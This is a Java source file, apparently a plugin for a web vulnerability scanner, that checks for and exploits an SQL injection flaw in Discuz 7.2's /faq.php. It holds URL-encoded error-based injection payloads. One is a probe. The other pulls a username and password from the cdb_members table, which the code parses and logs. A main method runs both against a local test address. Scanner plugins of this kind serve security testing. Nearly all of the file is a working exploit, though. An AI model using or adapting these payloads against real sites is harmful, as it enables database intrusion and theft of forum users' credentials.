package cn.com.nike.policy.policy;

import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import org.apache.commons.codec.digest.DigestUtils;
import org.apache.http.HttpEntity;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.util.EntityUtils;
import cn.com.nike.policy.base.Policy;
import cn.com.nike.policy.base.PolicyInfo;
import cn.com.nike.policy.bean.ParameterConstant;
import cn.com.nike.policy.bean.WebVulnData;
import cn.com.nike.policy.util.PolicyUtil;

public class Discuz_72_Injection_UserInfo extends PolicyInfo implements Policy {

	private String url = "";

	public Discuz_72_Injection_UserInfo() {
		POLICYNAME = Discuz_72_Injection_UserInfo.class.getName();
		POLICYID = "SSV-ID: 87114";
		POLICYCOMPANY = "DISCUZ";
		POLICYTIME = "2014-07-02";
		POLICYDESCRIPTION = "Discuz 7.2 /faq.php SQL注入漏洞获取用户名密码";
	}

	@Override
	public void setParameter(Map<String, Object> parameters) {

		url = parameters.get("url").toString();

		PAYLOAD_CHECK = "/faq.php?action=grouppermission&gids[99]='&gids[100][0]=)%20and%20(select%201%20from%20(select%20count(*),concat(md5(0x61646d696e),"
				+ "floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23";

		PAYLOAD_EXPLOIT = "/faq.php?action=grouppermission&gids[99]=%27&gids[100][0]=%29%20and%20%28select%201%20from%20%28select%20count%28*%29,concat%28"
				+ "%28"
				+ "select%20concat%28"
				+ "0x7e,username,0x3a,password,0x7e%29%20from%20cdb_members%20limit%200,1"
				+ "%29"
				+ ",floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%23";
	}

	@Override
	public boolean check() throws IOException {
		CloseableHttpClient httpclient = HttpClients.createDefault();
		CloseableHttpResponse response = null;
		try {
			HttpGet httpget = new HttpGet(url + PAYLOAD_CHECK);
			response = httpclient.execute(httpget);
			HttpEntity entity = response.getEntity();
			int code = response.getStatusLine().getStatusCode();
			String content = EntityUtils.toString(entity);
			if (code == 200 && content.contains(DigestUtils.md5Hex("admin"))) {
				log.info("存在注入");
				return true;
			}

		} catch (Exception e) {
			log.error("检测异常", e);
		} finally {
			if (response != null)
				response.close();
			httpclient.close();
		}

		return false;
	}

	@Override
	public WebVulnData exploit() throws IOException {

		WebVulnData webVulnData = new WebVulnData();

		CloseableHttpClient httpclient = HttpClients.createDefault();
		CloseableHttpResponse response = null;
		try {
			HttpGet httpget = new HttpGet(url + PAYLOAD_EXPLOIT);
			response = httpclient.execute(httpget);
			HttpEntity entity = response.getEntity();
			int code = response.getStatusLine().getStatusCode();
			String content = EntityUtils.toString(entity);
			if (code == 200) {

				List<String> result = PolicyUtil.regex("~(.*?)~", content, 1);
				String info = null;
				String[] infos = new String[2];

				if (result.size() > 0)
					info = result.get(0);

				if (info != null && info.indexOf(":") != -1)
					infos = info.split(":");

				if (infos.length != 2)
					return webVulnData;

				Map<String, String> data = new HashMap<String, String>();
				data.put(ParameterConstant.USERNAME, infos[0]);
				data.put(ParameterConstant.PASSWORD, infos[1]);
				log.info("用户名=" + infos[0] + " 密码=" + infos[1]);
				List<Map<String, String>> datas = new ArrayList<Map<String, String>>();
				datas.add(data);
				webVulnData.setResult(datas);

				return webVulnData;
			}

		} catch (Exception e) {
			log.error("检测异常", e);
		} finally {
			if (response != null)
				response.close();
			httpclient.close();
		}

		return webVulnData;
	}

	public static void main(String[] args) throws IOException {

		Map<String, Object> parameters = new HashMap<String, Object>();
		parameters.put("url", "http://127.0.0.1:81/discuz71");
		Discuz_72_Injection_UserInfo policy = new Discuz_72_Injection_UserInfo();
		policy.setParameter(parameters);
		if (policy.check())
			policy.exploit();

	}

}
